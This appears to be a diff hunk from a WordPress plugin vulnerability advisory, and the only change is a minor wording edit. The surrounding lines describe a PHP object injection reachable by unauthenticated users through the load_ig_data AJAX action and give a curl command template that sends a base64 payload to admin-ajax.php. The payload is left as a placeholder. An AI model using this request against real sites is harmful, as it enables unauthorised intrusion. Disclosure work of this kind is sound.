@@ -84,7 +84,7 @@ function load_ig_data() {
 add_action( 'wp_ajax_nopriv_load_ig_data', 'load_ig_data' );
 ```
 
-To exploit this, any unauthenticated user just needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint specifying the needed parameter to trigger the `maybe_unserialize` function.
+To exploit this, any unauthenticated user needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint specifying the needed parameter to trigger the `maybe_unserialize` function.
 
 ```bash
 curl "<WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=load_ig_data&data=x:<BASE64_ENCODEDED_OF_GENERATED_PHP_OBJECT_INJECTION_PAYLOAD"
